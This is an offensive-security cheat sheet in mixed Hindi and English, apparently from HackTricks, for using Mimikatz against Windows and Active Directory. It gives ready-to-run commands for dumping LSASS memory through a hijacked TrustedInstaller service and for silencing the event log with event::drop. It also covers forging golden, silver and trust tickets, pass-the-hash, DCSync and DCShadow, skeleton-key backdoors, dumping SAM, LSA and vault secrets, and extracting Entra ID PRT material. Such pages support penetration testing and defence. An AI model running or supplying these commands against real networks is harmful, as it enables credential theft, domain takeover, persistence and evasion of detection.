# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**यह पेज [adsecurity.org](https://adsecurity.org/?page_id=1821) के एक पेज पर आधारित है**। आगे की जानकारी के लिए मूल देखें!

## LM and Clear-Text in memory

Windows 8.1 और Windows Server 2012 R2 से आगे, credential theft से बचाव के लिए महत्वपूर्ण उपाय लागू किए गए हैं:

- **LM hashes and plain-text passwords** अब security बढ़ाने के लिए memory में store नहीं किए जाते। एक specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ को Digest Authentication disable करने के लिए DWORD value `0` पर set करना चाहिए, ताकि "clear-text" passwords LSASS में cache न हों।

- **LSA Protection** Local Security Authority (LSA) process को unauthorized memory reading और code injection से बचाने के लिए introduce किया गया है। यह LSASS को एक protected process mark करके achieve किया जाता है। LSA Protection enable करने के लिए:
1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ में registry को modify करके `RunAsPPL` को `dword:00000001` पर set करें।
2. एक Group Policy Object (GPO) लागू करें जो managed devices पर इस registry change को enforce करे।

इन protections के बावजूद, Mimikatz जैसे tools specific drivers का उपयोग करके LSA Protection को bypass कर सकते हैं, हालांकि ऐसे actions event logs में record होने की संभावना है।

Modern workstations पर यह और भी महत्वपूर्ण है क्योंकि **Credential Guard कई Windows 11 22H2+ और Windows Server 2025 domain-joined, non-DC systems पर by default enabled होता है**, जबकि **fresh Windows 11 22H2+ installs पर LSASS-as-PPL by default enabled होता है**। व्यवहार में, इसका मतलब है कि `sekurlsa::logonpasswords` अक्सर पुराने tradecraft की तुलना में कम material देता है और operators increasingly **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, या **CloudAP/PRT-oriented modules** की ओर pivot करते हैं। protection side के लिए [Windows credentials protections](credentials-protections.md) देखें।

### Counteracting SeDebugPrivilege Removal

Administrators के पास आमतौर पर SeDebugPrivilege होता है, जिससे वे programs को debug कर सकते हैं। इस privilege को restrict करके unauthorized memory dumps को रोका जा सकता है, जो attackers द्वारा memory से credentials निकालने की common technique है। हालांकि, इस privilege के हटाए जाने के बाद भी, TrustedInstaller account customized service configuration का उपयोग करके memory dumps perform कर सकता है:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
यह `lsass.exe` मेमोरी को एक फ़ाइल में dump करने की अनुमति देता है, जिसे बाद में credentials निकालने के लिए किसी अन्य system पर analyze किया जा सकता है:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:

#### Clearing Event Logs

- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
- The `event::drop` command then patches the Event Logging service.

### Kerberos Ticket Attacks

Use the commands below as quick syntax reminders. The dedicated pages for [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), and [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contain the up-to-date AES/PAC/opsec nuances.

### Golden Ticket Creation

A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: The domain name.
- `/sid`: The domain's Security Identifier (SID).
- `/user`: The username to impersonate.
- `/krbtgt`: The NTLM hash of the domain's KDC service account.
- `/ptt`: Directly injects the ticket into memory.
- `/ticket`: Saves the ticket for later use.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets विशिष्ट services तक access देते हैं। मुख्य command और parameters:

- Command: Golden Ticket के समान, लेकिन विशिष्ट services को target करता है।
- Parameters:
- `/service`: target करने वाली service (e.g., cifs, http).
- Other parameters Golden Ticket के समान।

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets का उपयोग trust relationships का लाभ उठाकर domains के across संसाधनों तक पहुँचने के लिए किया जाता है। मुख्य command और parameters:

- Command: Trust relationships के लिए Golden Ticket के समान।
- Parameters:
- `/target`: target domain का FQDN।
- `/rc4`: trust account के लिए NTLM hash।

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- वर्तमान user session के सभी Kerberos tickets की list करता है।

- **Pass the Cache**:

- Command: `kerberos::ptc`
- cache files से Kerberos tickets inject करता है।
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- किसी दूसरे session में Kerberos ticket use करने देता है।
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- session से सभी Kerberos tickets clear करता है।
- ticket manipulation commands use करने से पहले conflicts avoid करने के लिए useful है।

### Over-Pass-the-Hash / Pass-the-Key

अगर `RC4` disabled है या unreliable है, तो Mimikatz केवल NT hash use करने के बजाय current logon session में **AES128/AES256 Kerberos keys** patch कर सकता है। यह आमतौर पर modern domains के लिए `sekurlsa::pth` को NTLM-only मानने से बेहतर fit है।
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` मौजूदा process को नए console spawn करने के बजाय reuse करता है, जो तब handy होता है जब आप उसी context में तुरंत `lsadump::dcsync` जैसी चीज़ें run करना चाहते हैं।

### Active Directory Tampering

- **DCShadow**: अस्थायी रूप से एक machine को AD object manipulation के लिए DC की तरह act करने दें। देखें [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: password data request करने के लिए DC की नकल करें। देखें [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: LSA से credentials निकालें।

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: computer account के password data का उपयोग करके DC की नकल करें।

- _NetSync के लिए मूल context में कोई specific command प्रदान नहीं की गई है._

- **LSADUMP::SAM**: local SAM database तक पहुँचें।

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: registry में stored secrets को decrypt करें।

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: user के लिए नया NTLM hash सेट करें।

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: trust authentication information प्राप्त करें।
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

**Entra ID** या **hybrid-joined** hosts पर, `sekurlsa::cloudap` LSASS से cached **Primary Refresh Token (PRT)** material expose कर सकता है। यदि associated Proof-of-Possession key software-protected है, तो `dpapi::cloudapkd` follow-on **Pass-the-PRT** workflows के लिए आवश्यक clear/derived key material derive कर सकता है।
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
This becomes much harder when the key is TPM-backed, but it is worth checking on hybrid endpoints because the cached CloudAP data may be more interesting than classic `wdigest` output. For the cloud-side abuse chain, see [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: DC पर LSASS में एक backdoor inject करें।
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: backup rights प्राप्त करें।

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: debug privileges प्राप्त करें।
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: logged-on users के credentials दिखाएँ।

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: memory से Kerberos tickets extract करें।
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: SID और SIDHistory बदलें।

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _No specific command for modify in original context._

- **TOKEN::Elevate**: tokens impersonate करें।
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: multiple RDP sessions allow करें।

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP sessions की सूची दिखाएँ।
- _No specific command provided for TS::Sessions in original context._

### Vault

- Windows Vault से passwords extract करें।
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
